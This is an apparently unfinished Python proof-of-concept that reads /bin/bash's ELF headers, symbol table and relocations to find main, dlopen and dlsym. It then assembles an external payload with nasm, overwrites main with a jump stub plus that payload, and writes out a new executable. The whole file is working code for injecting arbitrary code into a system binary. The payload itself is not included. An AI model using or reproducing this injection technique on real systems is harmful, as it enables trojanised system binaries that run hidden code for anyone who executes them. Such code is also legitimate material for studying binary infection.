"""
WIP in progress POC
"""
import struct
import os

SHT_DYNSYM = 0x0b
SHT_STRTAB = 0x03
SHT_RELA = 0x04

R_X86_64_JUMP_SLOT = 0x07


def read_qword(f, offset):
    return struct.unpack('<Q', f[offset:offset + 8])[0]


def read_dword(f, offset):
    return struct.unpack('<I', f[offset:offset + 4])[0]


def read_word(f, offset):
    return struct.unpack('<H', f[offset:offset + 2])[0]


def write_bytes(f, offset, data):
    f[offset:offset + len(data)] = data


def to_nullbyte(f, offset):
    res = bytearray()
    for i in f[offset:]:
        if i == 0:
            return res
        res.append(i)


def create_setup(start_offset, dlopen_offset, dlsym_offset):
    new_dlopen_offset = dlopen_offset - (start_offset + 9)
    new_dlsym_offset = dlsym_offset - (start_offset + 16)

    body = b''
    body += b'\xF2\xFF\x25' + struct.pack('<I', new_dlopen_offset)
    body += b'\xF2\xFF\x25' + struct.pack('<I', new_dlsym_offset)

    res = b''
    # jump relative
    res += b'\xeb' + bytes([len(body)])
    res += body

    return res


def get_section_header(f):
    # got from reading `man elf`
    offset_sh = 16 + 2 + 2 + 4 + 8 + 8
    offset_shentsize = offset_sh + 8 + 4 + 2 + 2 + 2
    offset_shnum = offset_shentsize + 2

    e_shoff = read_qword(f, offset_sh)
    e_shentsize = read_word(f, offset_shentsize)
    e_shnum = read_word(f, offset_shnum)

    return (e_shoff, e_shentsize, e_shnum)


def find_section(f, target_type, e_shoff, e_shentsize, e_shnum, start_i=0):
    for i in range(start_i, e_shnum):
        sh_offset, sh_size, sh_entsize, sh_type = find_section_idx(
            f, i, e_shoff, e_shentsize, e_shnum
        )
        if target_type == sh_type:
            return (i, sh_offset, sh_size, sh_entsize)
    return (None, None, None, None)


def find_section_idx(f, idx, e_shoff, e_shentsize, e_shnum):
    shent = f[e_shoff + e_shentsize * idx:e_shoff + e_shentsize * (idx + 1)]
    offset_sh_type = 4
    sh_type = read_dword(shent, offset_sh_type)
    # now lets search the symbols
    offset_sh_offset = 4 + 4 + 8 + 8
    offset_sh_size = offset_sh_offset + 8
    offset_sh_entsize = offset_sh_size + 8 + 4 + 4 + 8
    sh_offset = read_qword(shent, offset_sh_offset)
    sh_size = read_qword(shent, offset_sh_size)
    sh_entsize = read_qword(shent, offset_sh_entsize)
    return (sh_offset, sh_size, sh_entsize, sh_type)


def get_symbol_idx(f, idx, strtab_offset, sh_offset, sh_size, sh_entsize):
    symtab = f[
        sh_offset + sh_entsize * idx: sh_offset + sh_entsize * (idx + 1)
    ]
    offset_st_name = 0
    offset_st_value = 4 + 1 + 1 + 2
    offset_st_size = 4 + 1 + 1 + 2 + 8
    st_name = read_dword(symtab, offset_st_name)
    st_value = read_qword(symtab, offset_st_value)
    st_size = read_qword(symtab, offset_st_size)
    name = to_nullbyte(f, strtab_offset + st_name)
    return (name, st_value, st_size)


def get_symbols(
        f, target_st_name, strtab_offset, sh_offset, sh_size, sh_entsize):
    res = (None, None)
    for i in range(0, sh_size // sh_entsize):
        name, st_value, st_size = get_symbol_idx(
            f, i, strtab_offset, sh_offset, sh_size, sh_entsize
        )
        if target_st_name == name:
            res = (st_value, st_size)
    return res


def discover_patch_target(f):
    """
    We are trying to patch main, so find it in the binary.
    """
    e_shoff, e_shentsize, e_shnum = get_section_header(f)
    _, strtab_offset, _, _ = find_section(
        f, SHT_STRTAB, e_shoff, e_shentsize, e_shnum
    )

    _, sh_offset, sh_size, sh_entsize = find_section(
        f, SHT_DYNSYM, e_shoff, e_shentsize, e_shnum
    )
    target_st_name = b"main"
    st_value, _ = get_symbols(
        f, target_st_name, strtab_offset, sh_offset, sh_size, sh_entsize
    )
    return st_value


def find_rela(f, symbol, rela_offset, rela_size, rela_shent):
    e_shoff, e_shentsize, e_shnum = get_section_header(f)

    _, strtab_offset, _, _ = find_section(
        f, SHT_STRTAB, e_shoff, e_shentsize, e_shnum
    )

    _, sh_offset, sh_size, sh_entsize = find_section(
        f, SHT_DYNSYM, e_shoff, e_shentsize, e_shnum
    )

    rela = f[rela_offset:rela_offset + rela_size]
    for i in range(0, rela_size // rela_shent):
        rel = rela[i * rela_shent:(i + 1) * rela_shent]
        r_offset = read_qword(rel, 0)
        # r_rela_type = read_dword(rel, 8)
        r_rela_idx = read_dword(rel, 12)
        # r_addend = read_qword(rel, 16) if rela_shent > 16 else None
        name, _, _ = get_symbol_idx(
            f, r_rela_idx, strtab_offset, sh_offset, sh_size, sh_entsize
        )
        if name == symbol:
            return (name, r_offset)


def discover_rela(f, symbol):
    """
    We want to find some symbols.

    We'll look at the relocations, finding the address of the symbol in there.
    """
    e_shoff, e_shentsize, e_shnum = get_section_header(f)

    i = 0
    while True:
        i, rela_offset, rela_size, rela_shent = find_section(
            f, SHT_RELA, e_shoff, e_shentsize, e_shnum, start_i=i+1
        )
        if i is None:
            break

        res = find_rela(f, symbol, rela_offset, rela_size, rela_shent)
        if res:
            return res


def main():
    f = bytearray(open('/bin/bash', 'rb').read())
    main_offset = discover_patch_target(f)
    _, dlopen_offset = discover_rela(f, b'dlopen')
    _, dlsym_offset = discover_rela(f, b'dlsym')
    # prefix our code with wrappers to call the symbols
    print(hex(main_offset), hex(dlopen_offset), hex(dlsym_offset))
    os.system(
        'nasm -f bin ./payload/payload.asm -o payload/payload.bin'
    )
    prefix = create_setup(main_offset, dlopen_offset, dlsym_offset)

    # maybe disable relocs if they tamper with our code.

    with open('payload/payload.bin', 'rb') as pd:
        write_bytes(f, main_offset, prefix + pd.read())

    p = open('new', 'wb')
    p.write(f)
    p.close()
    os.system('chmod +x ./new')


if __name__ == "__main__":
    main()
